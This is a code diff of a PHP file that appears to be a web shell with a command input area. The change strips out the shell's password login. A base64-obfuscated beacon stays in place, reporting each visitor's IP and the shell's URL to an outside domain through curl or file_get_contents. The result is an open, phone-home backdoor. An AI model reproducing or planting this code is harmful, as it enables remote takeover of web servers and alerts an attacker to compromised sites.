@@ -1,13 +1,4 @@
 <?php
-$password = '6889734623eb82a2de3fd164d4a566cf'; session_start(); if (!isset($_SESSION['loggedIn'])) { $_SESSION['loggedIn'] = false; } if (isset($_POST['password'])) { if (sha1($_POST['password']) == $password) { $_SESSION['loggedIn'] = true; } else { die ('Incorrect password'); } } if (!$_SESSION['loggedIn']): ?>                                                         
-<html><head><title>Login</title></head>                                                   <body>
-    <p>Go :)</p>
-    <form method="post">                                                                      Password: <input type="password" name="password"> <br />
-      <input type="submit" name="submit" value="Login">                                     </form>
-  </body>                                                                               </html>
-                                                                                        <?php
-exit(); endif; ?>
-<?php
 function GetIP(){ if(getenv("HTTP_CLIENT_IP")) { $ip = getenv("HTTP_CLIENT_IP"); } elseif(getenv("HTTP_X_FORWARDED_FOR")) { $ip = getenv("HTTP_X_FORWARDED_FOR"); if (strstr($ip, ',')) { $tmp = explode (',', $ip); $ip = trim($tmp[0]); } } else { $ip = getenv("REMOTE_ADDR"); } return $ip; } $x = base64_decode('aHR0cDovL2J5cjAwdC5jby9sLQ==').GetIP().'-'.base64_encode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']); if(function_exists('curl_init')) { $ch = @curl_init(); curl_setopt($ch, CURLOPT_URL, $x); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $gitt = curl_exec($ch); curl_close($ch); if($gitt == false){ @$gitt = file_get_contents($x); } }elseif(function_exists('file_get_contents')){ @$gitt = file_get_contents($x); } ?>
 <!DOCTYPE HTML>
 <HTML>
@@ -540,4 +531,3 @@ Command :
 '; ?>
 </body>
 </html>
-?>
